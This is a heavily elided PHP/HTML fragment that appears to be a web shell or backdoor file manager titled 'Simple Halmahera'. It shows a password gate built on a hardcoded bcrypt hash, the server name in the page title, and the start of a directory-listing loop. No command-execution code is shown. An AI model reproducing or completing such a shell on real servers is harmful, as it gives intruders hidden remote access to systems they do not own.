...
if (!isset($_SESSION['authenticated'])) {
    $stored_hashed_password = '$2a$10$MYYdAVGH4l.06HMEos0ey.qfPEzyaFDmPEnqyw6dOdUja4gN94iDm';
...
<html>
    <head>
        ...
        <title>Simple Halmahera [ <?= $serv; ?> ]</title>
                            ...
                            <tbody class="text-nowrap">
                                <tr>
                                    <td colspan="7" class="text-center">
                                        <img src="https://res.cloudinary.com/dpvlnsf7p/image/upload/v1749411925/unicorn-jahat_jo0ria.png" alt="Halmahera" style="max-width: 200px; height: auto;"
                                    </td>
                                </tr>
                                <?php
                                    foreach ($dirs as $dir) :
